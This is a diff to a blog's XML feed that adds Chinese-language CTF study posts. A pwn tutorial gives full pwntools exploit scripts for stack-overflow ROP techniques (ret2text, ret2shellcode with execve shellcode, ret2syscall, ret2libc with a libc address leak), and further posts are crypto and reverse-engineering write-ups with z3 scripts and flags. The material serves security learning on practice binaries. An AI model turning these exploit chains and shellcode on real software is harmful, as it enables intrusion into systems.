@@ -4,6 +4,141 @@
   
   
   <entry>
+    <title>pwn入门（1）basicROP</title>
+    <link href="/2020/05/11/202005111717/"/>
+    <url>/2020/05/11/202005111717/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p>萌新开始了自己的pwn学习（感觉团队进步速度不够，准备带头拓展一下业务）接下来一段时间我将会抽出时间学习pwn，首先按照ctf wiki完成知识学习。</p></blockquote><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>栈溢出(stack overflow)指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p><p>发生栈溢出的前提：</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><p>输入函数：gets,scanf,vscanf</p><p>输出函数：sprintf</p><p>字符串：strcpy，strcat，bcopy</p><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>确定变量到栈底的距离</p><blockquote><p>下面，我们用几个例子入门rop</p></blockquote><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank" rel="noopener">题目地址</a></p><p>函数中存在gets，怀疑栈溢出漏洞</p><p>存在 system(“/bin/sh”)，因此可以直接控制程序返回，payload如下：</p><pre><code class="python">#!/usr/bin/env python#coding=utf8from pwn import *context.log_level = &#39;debug&#39;   #显示调试的信息context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]   #？local = 1  #设置是本地还是远程渗透if local:    p = process(&#39;./te&#39;)else:    p=remote(&#39;111.198.29.45&#39;,43732)    passsys_addr=0x804863apayload = &quot;A&quot;*0x6c+&#39;a&#39;*4 + p32(sys_addr)def choose2():    #p.recvuntil(&quot;please input\n&quot;)  这个在一般情况是需要添加的  可是这个题不知道为什么添加就不执行shell了        p.recvuntil(&quot;anything?\n&quot;)        p.sendline(payload)#raw_input()  用来断在开始的位置#gdb.attach(p)  可以用动态调试    p.interactive()choose2()</code></pre><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>shellcode是一串汇编代码，主要功能是获取目标系统的shell，一般来说需要我们自己填充shell，填充shell需要一段可执行的空间。</p><p>下面来看<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="noopener">例题</a></p><p>仍然是gets函数，这次没有控制函数，但是有一段可执行的bss，写入shellcode</p><pre><code class="python">#!/usr/bin/env python#coding=utf8from pwn import *context.log_level = &#39;debug&#39;   #显示调试的信息context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]   #？context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)local = 1  #设置是本地还是远程渗透if local:    p = process(&#39;./te&#39;)else:    p=remote(&#39;111.198.29.45&#39;,43732)    passshellcode = &quot;\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34&quot;bss_addr=0x804a080payload = shellcode.ljust(112,&#39;a&#39;) + p32(bss_addr)def choose2():    #p.recvuntil(&quot;please input\n&quot;)  这个在一般情况是需要添加的  可是这个题不知道为什么添加就不执行shell了        p.recvuntil(&quot;!!!\n&quot;)        p.sendline(payload)#raw_input()  用来断在开始的位置#gdb.attach(p)  可以用动态调试    p.interactive()choose2() </code></pre><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>返回一串系统调用，系统调用示例如下：</p><pre><code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></pre><pre><code class="python">#!/usr/bin/env python#coding=utf8from pwn import *context.log_level = &#39;debug&#39;   #显示调试的信息context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]   #？context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)local = 1  #设置是本地还是远程渗透if local:    p = process(&#39;./te&#39;)else:    p=remote(&#39;111.198.29.45&#39;,43732)    passp1=0x80bb196p2=0x806eb90s1=0x80be408sys=0x8049421payload=&#39;A&#39;*0x6c+&#39;a&#39;*4+p32(p1)+p32(0xb)+p32(p2)+p32(0)+p32(0)+p32(s1)+p32(sys)def choose2():        p.recvuntil(&quot;do?\n&quot;)        p.sendline(payload)#raw_input()  用来断在开始的位置#gdb.attach(p)  可以用动态调试    p.interactive()choose2()</code></pre><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1" target="_blank" rel="noopener">题目地址</a></p><p>返回执行system函数即可</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *sh = process(&#39;./ret2libc1&#39;)binsh_addr = 0x8048720system_plt = 0x08048460payload = flat([&#39;a&#39; * 112, system_plt, &#39;b&#39; * 4, binsh_addr])sh.sendline(payload)sh.interactive()</code></pre><h3 id="构造字符串"><a href="#构造字符串" class="headerlink" title="构造字符串"></a>构造字符串</h3><p>这道题中没有”/bin/sh”，我们需要手动把这个字符串输进程序</p><pre><code class="python">#!/usr/bin/env python#coding=utf8from pwn import *context.log_level = &#39;debug&#39;   #显示调试的信息context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]   #？context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)local = 1  #设置是本地还是远程渗透if local:    p = process(&#39;./ret2libc2&#39;)else:    p=remote(&#39;111.198.29.45&#39;,43732)    passgets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat([&#39;a&#39; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])def choose2():        p.recvuntil(&quot;What do you think ?&quot;)        p.sendline(payload)        # gdb.attach(p)  # 可以用动态调试        p.sendline(&quot;/bin/sh&quot;)#raw_input()  用来断在开始的位置    p.interactive()choose2()</code></pre><h3 id="libc与随机地址"><a href="#libc与随机地址" class="headerlink" title="libc与随机地址"></a>libc与随机地址</h3><p>仍然是gets函数的栈溢出，去掉了system函数的地址。</p><p>基本的dump地址找libc库的思路</p><pre><code class="python">#!/usr/bin/env python#coding=utf8from pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#39;debug&#39;   #显示调试的信息context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]   #？context(os=&#39;linux&#39;,log_level=&#39;debug&#39;)local = 1  #设置是本地还是远程渗透if local:    p = process(&#39;./ret2libc3&#39;)    #bin = ELF(&#39;./&#39;,checksec=False)    #libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,checksec=False)else:    p=remote(&#39;111.198.29.45&#39;,43732)    #bin = ELF(&#39;./&#39;,checksec=False)    #libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,checksec=False)    passret2libc3 = ELF(&#39;./ret2libc3&#39;)puts_plt=0x8048460main_addr=0x8048618puts_got=ret2libc3.got[&#39;puts&#39;]payload=112*&#39;a&#39;+p32(puts_plt)+p32(main_addr)+p32(puts_got)def choose2():        p.recvuntil(&quot;Can you find it !?&quot;)        p.sendline(payload)        puts_addr = u32(p.recv()[0:4])        libc = LibcSearcher(&#39;puts&#39;,puts_addr)        libc_base = puts_addr - libc.dump(&#39;puts&#39;)        system_addr = libc_base + libc.dump(&#39;system&#39;)        binsh = libc_base + libc.dump(&#39;str_bin_sh&#39;)        # p.recvuntil(&quot;!?&quot;)        p.sendline(&#39;a&#39;*104+p32(system_addr)+p32(0x08048618)+p32(binsh))        # gdb.attach(p)    # raw_input()  用来断在开始的位置    p.interactive()choose2()</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>pwn学习</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>信息安全</tag>
+      
+      <tag>pwn</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>crypto入门 buuctf刷题记录（1）</title>
+    <link href="/2020/05/11/202005111715/"/>
+    <url>/2020/05/11/202005111715/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p>有大佬给我推荐了buuctf平台，去平台学习，记录一些有意思的。</p></blockquote><h2 id="rabbit"><a href="#rabbit" class="headerlink" title="rabbit"></a>rabbit</h2><p><a href="https://files.buuoj.cn/files/3aebe57d15403d745e63e964e670e3e5/bfdb217e-b914-4314-9a1b-a26a286475a3.zip?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxMzZ9.XqaHDA.0qXtLx8neFbE4rbMkS110Pw88NU" target="_blank" rel="noopener">题目地址</a></p><p>一种叫做rabbit的流密码，本题在线解密即可。</p><h2 id="密码学的心声"><a href="#密码学的心声" class="headerlink" title="密码学的心声"></a>密码学的心声</h2><p><a href="https://files.buuoj.cn/files/e4f12b8c336823c121a7a70f5c481025/93ffdda9-7931-4753-aee3-0c05df7bc9b5.bmp?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxODN9.XqaRrw.ddujMakK1LDJ1nlaoGDiH92KGoE" target="_blank" rel="noopener">题目地址</a></p><p>看到了一个曲谱,由于所有数字都小于8，考虑八进制组合，3个一组，得出flag</p><h2 id="佛说：只能四天"><a href="#佛说：只能四天" class="headerlink" title="佛说：只能四天"></a>佛说：只能四天</h2><p><a href="https://files.buuoj.cn/files/96f4e049df1e4a9bffcea9820c8acda3/attachment.zip?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxNzg4fQ.XqpBOg.JupE0Zueil2C15oyys2785iERtw" target="_blank" rel="noopener">题目地址</a></p><p>根据题目描述，首先判断出是新与佛论禅</p><p>得出一堆富强民主文明和谐，猜测是核心价值观加密</p><p>得到一串字母和doyouknowfence</p><p>栅栏密码，推到4时发现doyouknowcaesar</p><p>凯撒的本意是移位3，所以得出一串字母</p><p>字母由大写的26个字母和2-7组成，很可能是base32</p><p>得出flag</p><h2 id="2018CISCN-oldstreaming"><a href="#2018CISCN-oldstreaming" class="headerlink" title="2018CISCN oldstreaming"></a>2018CISCN oldstreaming</h2><p><a href="https://files.buuoj.cn/files/36826b80bcc36bb17715b68057117573/attachment.bz2?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxMzA0fQ.XqgDxw.95ktAz9823n5DqnCDE-4Ap6D3Ak" target="_blank" rel="noopener">题目地址</a></p><p>LFSR线性移位反馈寄存器，具体知识参考ctf wiki相关章节</p><p>2^32的范围，按常理来说爆破可行，但我们选择一个更有意义的解法，比特分析：</p><p>根据输出的前31位，可以确定key的最低位，然后递推即可。</p><pre><code>flag{926201d7}</code></pre><h2 id="坏蛋是雷宾"><a href="#坏蛋是雷宾" class="headerlink" title="坏蛋是雷宾"></a>坏蛋是雷宾</h2><p>rabin算法基础题，了解rabin原理，爆破得出结果。</p><pre><code class="python">n=523798549c=162853095for i in range(0,523798549):    if pow(i,2)%n==c:        print i# 115739001# 214318436# 309480113# 408059548</code></pre><p>爆破得出四个结果，转换二进制后六位是否为110001，确认309480113符合条件，移除后六位后即为明文。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF题目复现</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>信息安全</tag>
+      
+      <tag>crypto</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>GUET-ctf2019 re</title>
+    <link href="/2020/05/11/202005111714/"/>
+    <url>/2020/05/11/202005111714/</url>
+    
+    <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>无，<a href="https://files.buuoj.cn/files/a83068d825343ba3c969ac5f79f9d39c/attachment.zip?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjo1ODN9.XqqqGQ.SWvE5L6tkr3ohbe_lKfYjkl_RQM" target="_blank" rel="noopener">题目地址</a></p><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><blockquote><p>这道题本身没太大难度，记录这道题的目的是记录一下之前提到的z3库的使用</p></blockquote><p>脱掉upx壳，直接解密就可以，用一下z3库提高效率：</p><pre><code class="python">from z3 import *s = Solver()a1 = [0]*32for i in range(32):    a1[i] = Int(&#39;a1[&#39;+str(i)+&#39;]&#39;)s.add( 1629056 * a1[0] == 166163712 )s.add( 6771600 * a1[1] == 731332800 )s.add( 3682944 * a1[2] == 357245568 )s.add( 10431000 * a1[3] == 1074393000 )s.add( 3977328 * a1[4] == 489211344 )s.add( 5138336 * a1[5] == 518971936 )s.add( 7532250 * a1[7] == 406741500 )s.add( 5551632 * a1[8] == 294236496 )s.add( 3409728 * a1[9] == 177305856 )s.add( 13013670 * a1[10] == 650683500 )s.add( 6088797 * a1[11] == 298351053 )s.add( 7884663 * a1[12] == 386348487 )s.add( 8944053 * a1[13] == 438258597 )s.add( 5198490 * a1[14] == 249527520 )s.add( 4544518 * a1[15] == 445362764 )s.add( 3645600 * a1[17] == 174988800 )s.add( 10115280 * a1[16] == 981182160 )s.add( 9667504 * a1[18] == 493042704 )s.add( 5364450 * a1[19] == 257493600 )s.add( 13464540 * a1[20] == 767478780 )s.add( 5488432 * a1[21] == 312840624 )s.add( 14479500 * a1[22] == 1404511500 )s.add( 6451830 * a1[23] == 316139670 )s.add( 6252576 * a1[24] == 619005024 )s.add( 7763364 * a1[25] == 372641472 )s.add( 7327320 * a1[26] == 373693320 )s.add( 8741520 * a1[27] == 498266640 )s.add( 8871876 * a1[28] == 452465676 )s.add( 4086720 * a1[29] == 208422720 )s.add( 9374400 * a1[30] == 515592000 )s.add(5759124 * a1[31] == 719890500)s.check()print(s.model())</code></pre><p>输出发现少了一位，直接爆破就可以，最终结果：flag{e165421110ba03099a1c039337}</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF题目复现</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>信息安全</tag>
+      
+      <tag>Re</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>网鼎杯2020 re</title>
+    <link href="/2020/05/11/202005111707/"/>
+    <url>/2020/05/11/202005111707/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p>这次的网鼎杯，四道re做出了两个windows的，android的脱壳弄了好久运行环境没搞定（对安卓逆向不熟悉，以后得多学一点安卓）,至于那个全场0 solve的android我根本就没想。</p></blockquote><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p>假虚拟机逆向，手动走流程就可以走到最后</p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>查壳，32bit，PE，无壳</p><p>传入一个114长度的数组，用switch进行一段处理，通过ida查看伪码，我们很容易分析出，先是输入一串字符串，每执行到8是对输入的字符串进行处理，每执行到1是给一个验证数组元素赋值，执行到7是比对验证数组，当全部比对正确时，可以写出flag脚本。</p><h3 id="求解思路"><a href="#求解思路" class="headerlink" title="求解思路"></a>求解思路</h3><p>了解流程后，我们开始逆向这个过程，题目中有几个位置是FFFFFF8A等数值，不是很了解，通过手动patch得出最终结果。</p><p>flag{757515121f3d478}</p><h2 id="bang（未解出）"><a href="#bang（未解出）" class="headerlink" title="bang（未解出）"></a>bang（未解出）</h2><blockquote><p>比赛期间弄环境是大忌，这次的失误也警示自己要学习一下android。</p></blockquote><p>很遗憾，这道几乎是签到题的题目由于我对android完全不了解而没能做出。</p><p>赛后通过fart完成脱壳，核心代码：</p><pre><code class="java">public void onClick(View paramAnonymousView)      {        String str = localEditText.getText().toString();        paramAnonymousView = paramBundle.getText().toString();        if (str.equals(paramAnonymousView))        {          MainActivity.showmsg(&quot;user is equal passwd&quot;);        }        else if ((str.equals(&quot;admin&quot;) &amp; paramAnonymousView.equals(&quot;pass71487&quot;)))        {          MainActivity.showmsg(&quot;success&quot;);          MainActivity.showmsg(&quot;flag is flag{borring_things}&quot;);        }        else        {          MainActivity.showmsg(&quot;wrong&quot;);        }</code></pre><p> flag{borring_things}</p><h2 id="jocker"><a href="#jocker" class="headerlink" title="jocker"></a>jocker</h2><blockquote><p>很难理解出题人最后让猜一步的心态。</p></blockquote><p>代码中有混淆和栈平衡破坏，不会改，但是也可以看到大部分流程</p><h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>首先输入flag，wrong函数对flag按奇偶位进行异或，减处理</p><p>omg函数，将变换后的函数和unk_4030C0进行比较，解出flag{fak3_alw35_sp_me!!}</p><pre><code class="python">a=[  102, 107, 99, 100,  127,    97, 103,  100,  59, 86,  107,   97, 123,  38,   59,    80, 99,  95,  77,  90,    113,   12, 55,102]str=&quot;&quot;for i in range(0,12):    a[i*2]=a[i*2]^(i*2)    a[i*2+1]=a[i*2+1]+i*2+1    str=str+chr(a[i*2])+chr(a[i*2+1])print(a)print(str)</code></pre><p>接下来开始动态调试encrypt函数，发现字符串与hahahaha_do_you_find_me?的前19位进行异或</p><pre><code class="python">str=[&#39;h&#39;,&#39;a&#39;,&#39;h&#39;,&#39;a&#39;,&#39;h&#39;,&#39;a&#39;,&#39;h&#39;,&#39;a&#39;,&#39;_&#39;,&#39;d&#39;,&#39;o&#39;,&#39;_&#39;,&#39;y&#39;,&#39;o&#39;,&#39;u&#39;,&#39;_&#39;,&#39;f&#39;,&#39;i&#39;,&#39;n&#39;,&#39;d&#39;,&#39;_&#39;,&#39;m&#39;,&#39;e&#39;,&#39;?&#39;]a=[ 0x0000000E, 0x0000000D, 0x00000009, 0x00000006, 0x00000013, 0x00000005, 0x00000058,0x00000056, 0x0000003E, 0x00000006, 0x0000000C, 0x0000003C, 0x0000001F, 0x00000057, 0x00000014,0x0000006B, 0x00000057, 0x00000059, 0x0000000D]ans=&quot;&quot;for i in range(0,len(a)):    str[i]=chr(ord(str[i])^a[i])    ans=ans+str[i]print(ans)</code></pre><p>得到flag{d07abccf8a410c，还剩下最后五位，随便把五位填上重新调试程序</p><p>查看finally函数，没发现什么验证和处理，但是看到了定义了五个数值，而且flag第一位就过不去检测！所以爆破不存在的。做题的时候就觉得这五个数是不会凭空出现的，于是尝试最后一个数值和’}’异或，得出的数值分别异或之前的几个数值，得出猜测的flag，correct！</p><p>flag{d07abccf8a410cb37a}</p><hr><blockquote><p>还有个不是re的也顺便写一下吧</p></blockquote><h2 id="boom（crypto）"><a href="#boom（crypto）" class="headerlink" title="boom（crypto）"></a>boom（crypto）</h2><blockquote><p>全场最简单的一道题，完全是送分</p></blockquote><p>一个程序，首先是MD5解密，在线找就行</p><p>然后解一个三元一次方程组，懒人是不会自己解方程的，z3库终于用上了。</p><pre><code class="python">from z3 import *s=Solver()a1=[0]*3for i in range(3):    a1[i]=Int(&#39;a1[&#39;+str(i)+&#39;]&#39;)s.add(3*a1[0]-a1[1]+a1[2]==185)s.add(2*a1[0]+3*a1[1]-a1[2]==321) s.add(a1[0]+a1[1]+a1[2]==173)s.check()print(s.model())</code></pre><p>最后解一元二次方程，求根公式就可以</p><p>flag格式不了解（这个是我脑残了，拿cmd运行就可以了），用ida看了下格式</p><p>flag{en5oy_746831_89127561}</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF比赛wp</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>信息安全</tag>
+      
+      <tag>Re</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>buuctf密码学入门</title>
+    <link href="/2020/04/30/202004301334/"/>
+    <url>/2020/04/30/202004301334/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p>有大佬给我推荐了buuctf平台，去平台玩一玩，记录一些有意思的。</p></blockquote><h2 id="rabbit"><a href="#rabbit" class="headerlink" title="rabbit"></a>rabbit</h2><p><a href="https://files.buuoj.cn/files/3aebe57d15403d745e63e964e670e3e5/bfdb217e-b914-4314-9a1b-a26a286475a3.zip?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxMzZ9.XqaHDA.0qXtLx8neFbE4rbMkS110Pw88NU" target="_blank" rel="noopener">题目地址</a></p><p>一种叫做rabbit的流密码，本题在线解密即可。</p><h2 id="密码学的心声"><a href="#密码学的心声" class="headerlink" title="密码学的心声"></a>密码学的心声</h2><p><a href="https://files.buuoj.cn/files/e4f12b8c336823c121a7a70f5c481025/93ffdda9-7931-4753-aee3-0c05df7bc9b5.bmp?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxODN9.XqaRrw.ddujMakK1LDJ1nlaoGDiH92KGoE" target="_blank" rel="noopener">题目地址</a></p><p>看到了一个曲谱,由于所有数字都小于8，考虑八进制组合，3个一组，得出flag</p><h2 id="佛说：只能四天"><a href="#佛说：只能四天" class="headerlink" title="佛说：只能四天"></a>佛说：只能四天</h2><p><a href="https://files.buuoj.cn/files/96f4e049df1e4a9bffcea9820c8acda3/attachment.zip?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxNzg4fQ.XqpBOg.JupE0Zueil2C15oyys2785iERtw" target="_blank" rel="noopener">题目地址</a></p><p>根据题目描述，首先判断出是新与佛论禅</p><p>得出一堆富强民主文明和谐，猜测是核心价值观加密</p><p>得到一串字母和doyouknowfence</p><p>栅栏密码，推到4时发现doyouknowcaesar</p><p>凯撒的本意是移位3，所以得出一串字母</p><p>字母由大写的26个字母和2-7组成，很可能是base32</p><p>得出flag</p><h2 id="2018CISCN-oldstreaming"><a href="#2018CISCN-oldstreaming" class="headerlink" title="2018CISCN oldstreaming"></a>2018CISCN oldstreaming</h2><p><a href="https://files.buuoj.cn/files/36826b80bcc36bb17715b68057117573/attachment.bz2?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxMzA0fQ.XqgDxw.95ktAz9823n5DqnCDE-4Ap6D3Ak" target="_blank" rel="noopener">题目地址</a></p><p>LFSR线性移位反馈寄存器，具体知识参考ctf wiki相关章节</p><p>2^32的范围，按常理来说爆破可行，但我们选择一个更有意义的解法，比特分析：</p><p>根据输出的前31位，可以确定key的最低位，然后递推即可。</p><pre><code>flag{926201d7}</code></pre><h2 id="坏蛋是雷宾"><a href="#坏蛋是雷宾" class="headerlink" title="坏蛋是雷宾"></a>坏蛋是雷宾</h2><p>rabin算法基础题，了解rabin原理，爆破得出结果。</p><pre><code class="python">n=523798549c=162853095for i in range(0,523798549):    if pow(i,2)%n==c:        print i# 115739001# 214318436# 309480113# 408059548</code></pre><p>爆破得出四个结果，转换二进制后六位是否为110001，确认309480113符合条件，移除后六位后即为明文。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF题目复现</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>信息安全</tag>
+      
+      <tag>crypto</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>安恒4月月赛部分题解</title>
     <link href="/2020/04/26/anheng-2020-4/"/>
     <url>/2020/04/26/anheng-2020-4/</url>
@@ -13,7 +148,7 @@
     
     <categories>
       
-      <category>CTF题目复现</category>
+      <category>CTF比赛wp</category>
       
     </categories>
     
